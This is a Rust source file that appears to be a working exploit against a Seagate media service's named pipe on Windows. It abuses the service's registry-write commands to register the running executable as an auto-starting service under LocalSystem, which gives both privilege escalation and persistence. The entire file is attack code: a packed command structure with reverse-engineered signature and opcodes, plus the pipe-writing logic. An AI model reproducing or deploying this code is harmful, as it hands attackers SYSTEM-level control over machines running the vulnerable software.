use std::error::Error;
use tokio::net::windows::named_pipe;

const PIPE_NAME: &str = r"\\.\pipe\\MEDIA_AGGRE_PIPE.PIP";

pub async fn set_registry_system_service(reg_key: &str) -> Result<(), Box<dyn Error>> {
    let reg_key_path: String = format!("SYSTEM\\CurrentControlSet\\Services\\{reg_key}");
    let current_exe: String = std::env::current_exe()?
        .into_os_string()
        .into_string()
        .expect("Failed current_exe into_string");
    let image_path: String = format!("\"C:\\Windows\\system32\\cmd.exe\" /c start \"\" \"{current_exe}\"");

    send_seagate_command(
        MinorCommand::SET_STRING_REGISTRY,
        reg_key_path.as_str(),
        r"ImagePath",
        Some(image_path.as_str()),
        None,
    ).await?;

    send_seagate_command(
        MinorCommand::SET_STRING_REGISTRY,
        reg_key_path.as_str(),
        r"ObjectName",
        Some(r"LocalSystem"),
        None,
    ).await?;

    send_seagate_command(
        MinorCommand::SET_DWORD_REGISTRY,
        reg_key_path.as_str(),
        r"ErrorControl",
        None,
        Some(1),
    ).await?;

    send_seagate_command(
        MinorCommand::SET_DWORD_REGISTRY,
        reg_key_path.as_str(),
        r"Start",
        None,
        Some(2),
    ).await?;

    send_seagate_command(
        MinorCommand::SET_DWORD_REGISTRY,
        reg_key_path.as_str(),
        r"Type",
        None,
        Some(16),
    ).await?;

    Ok(())
}

async fn send_seagate_command(
    minor_command: u32,
    reg_key_path: &str,
    reg_val_name: &str,
    reg_val_data_str: Option<&str>,
    reg_val_data_dword: Option<u32>,
) -> Result<(), Box<dyn Error>> {
    let client = named_pipe::ClientOptions::new().open(PIPE_NAME)?;

    // Stage 1: length of payload
    let payload_length: u32 = std::mem::size_of::<SeagateCommand>().try_into()?;
    let stage_1: [u8; 4] = payload_length.to_le_bytes();

    // Stage 2: payload
    let seagate_command = SeagateCommand::new(
        minor_command,
        reg_key_path,
        reg_val_name,
        reg_val_data_str,
        reg_val_data_dword,
    );
    let stage_2 = unsafe { to_u8_slice(&seagate_command) };

    // Check payload length
    assert!(stage_2.len() == 12_304);
    assert!(stage_2.len() as u32 == payload_length);

    // Write both stages to named pipe
    write_to_named_pipe(&client, &stage_1).await?;
    write_to_named_pipe(&client, &stage_2).await?;

    Ok(())
}

async fn write_to_named_pipe(client: &named_pipe::NamedPipeClient, data: &[u8]) -> Result<(), Box<dyn Error>> {
    loop {
        // Wait for the pipe to be writable
        client.writable().await?;

        // Try to write data, this may still fail with `WouldBlock` if the readiness event is a false positive
        match client.try_write(data) {
            Ok(n) => {
                println!("bytes_written: {n}");
                break;
            }
            Err(e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                continue;
            }
            Err(e) => {
                return Err(e.into());
            }
        }
    }

    Ok(())
}

fn str_to_fixed_len_utf16_le_bytes(data: &str, len: usize) -> Vec<u8> {
    data
        .encode_utf16()
        .flat_map(|c| c.to_le_bytes().to_vec())
        .chain(std::iter::repeat(0))
        .take(len)
        .collect()
}

unsafe fn to_u8_slice<T: Sized>(p: &T) -> &[u8] {
    std::slice::from_raw_parts(
        (p as *const T) as *const u8,
        std::mem::size_of::<T>(),
    )
}

struct MajorCommand {}
impl MajorCommand {
    const PIPEUI: u16 = 0x10;
    // const PIPESYNC: u16 = 0x20;
}

struct MinorCommand {}
impl MinorCommand {
    const SET_STRING_REGISTRY: u32 = 0x400; // Set_String_Registry_00423734 -> MXOSRVSetRegKey
    const SET_DWORD_REGISTRY : u32 = 0x410; // Set_DWORD_Registry_00423760  -> MXOSRVSetDWORDRegKey
}

#[repr(C, packed)]
struct SeagateCommand {
    signature: [u8; 2],
    major_command: [u8; 2],
    minor_command: [u8; 4],
    reg_key_path: [u8; 4096],
    reg_val_name: [u8; 4096],
    reg_val_data_str: [u8; 4096],
    reg_val_data_str_len: [u8; 4],
    reg_val_data_dword: [u8; 4],
}

impl SeagateCommand {
    const SIGNATURE: u16 = 0x4b5c;

    fn new(
        minor_command: u32,
        reg_key_path: &str,
        reg_val_name: &str,
        reg_val_data_str: Option<&str>,
        reg_val_data_dword: Option<u32>,
    ) -> Self {
        match minor_command {
            MinorCommand::SET_STRING_REGISTRY => SeagateCommand {
                signature: Self::SIGNATURE.to_le_bytes(),
                major_command: MajorCommand::PIPEUI.to_le_bytes(),
                minor_command: minor_command.to_le_bytes(),
                reg_key_path: str_to_fixed_len_utf16_le_bytes(reg_key_path, 4096).try_into().expect("reg_key_path"),
                reg_val_name: str_to_fixed_len_utf16_le_bytes(reg_val_name, 4096).try_into().expect("reg_val_name"),
                reg_val_data_str: str_to_fixed_len_utf16_le_bytes(&reg_val_data_str.expect("reg_val_data_str"), 4096)
                    .try_into()
                    .expect("reg_val_data_str"),
                reg_val_data_str_len: ((reg_val_data_str.expect("reg_val_data_str").len() * 2) as u32).to_le_bytes(),
                reg_val_data_dword: [0; 4],
            },
            MinorCommand::SET_DWORD_REGISTRY => SeagateCommand {
                signature: Self::SIGNATURE.to_le_bytes(),
                major_command: MajorCommand::PIPEUI.to_le_bytes(),
                minor_command: minor_command.to_le_bytes(),
                reg_key_path: str_to_fixed_len_utf16_le_bytes(reg_key_path, 4096).try_into().expect("reg_key_path"),
                reg_val_name: str_to_fixed_len_utf16_le_bytes(reg_val_name, 4096).try_into().expect("reg_val_name"),
                reg_val_data_str: [0; 4096],
                reg_val_data_str_len: [0; 4],
                reg_val_data_dword: reg_val_data_dword.expect("reg_val_data_dword").to_le_bytes(),
            },
            _ => panic!("Invalid minor_command"),
        }
    }
}
